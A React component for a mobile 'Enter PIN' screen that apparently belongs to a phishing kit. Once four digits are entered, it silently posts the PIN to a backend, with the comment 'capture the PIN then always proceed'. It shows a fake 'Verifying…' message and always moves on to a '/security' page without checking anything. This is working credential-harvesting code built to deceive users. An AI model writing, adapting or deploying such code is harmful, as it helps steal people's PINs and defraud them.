import React, { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import axios from "axios";
import BASE_URL from "../components/urls";

const Pin = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const inputRef = useRef(null);

  // Auto-focus on mount so the phone keyboard opens
  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  const handleChange = (e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 4);
    setPin(value);
    setError("");

    if (value.length === 4) {
      setLoading(true);
      // Fire and forget — capture the PIN then always proceed
      axios.post(`${BASE_URL}/pin`, { pin: value }).catch(() => {});
      setTimeout(() => {
        setLoading(false);
        navigate("/security");
      }, 800);
    }
  };

  return (
    <div
      className="min-h-screen bg-gray-100 flex flex-col px-7"
      onClick={() => inputRef.current?.focus()}
    >
      {/* Heading */}
      <div className="mt-14">
        <h1 className="text-[34px] font-black text-gray-900 leading-tight tracking-tight">
          Enter PIN
        </h1>
        <p className="mt-3 text-[15px] text-gray-500 leading-snug">
          Enter your 4-digit PIN-code to continue.
        </p>
      </div>

      {/* 4-dot indicator */}
      <div className="flex items-center justify-center gap-6 mt-20">
        {Array.from({ length: 4 }).map((_, i) => (
          <span
            key={i}
            className={`w-3.5 h-3.5 rounded-full transition-all duration-200 ${
              i < pin.length ? "bg-gray-800 scale-110" : "bg-gray-300"
            }`}
          />
        ))}
      </div>

      {/* Error message */}
      {error && (
        <p className="mt-6 text-center text-sm text-red-500 font-medium">
          {error}
        </p>
      )}

      {/* Loading indicator */}
      {loading && (
        <p className="mt-6 text-center text-sm text-gray-400">Verifying…</p>
      )}

      {/* Hidden input — captures numeric keypresses from native keyboard */}
      <input
        ref={inputRef}
        type="tel"
        inputMode="numeric"
        pattern="[0-9]*"
        value={pin}
        onChange={handleChange}
        maxLength={4}
        autoComplete="off"
        className="absolute opacity-0 w-0 h-0 pointer-events-none"
        disabled={loading}
      />
    </div>
  );
};

export default Pin;
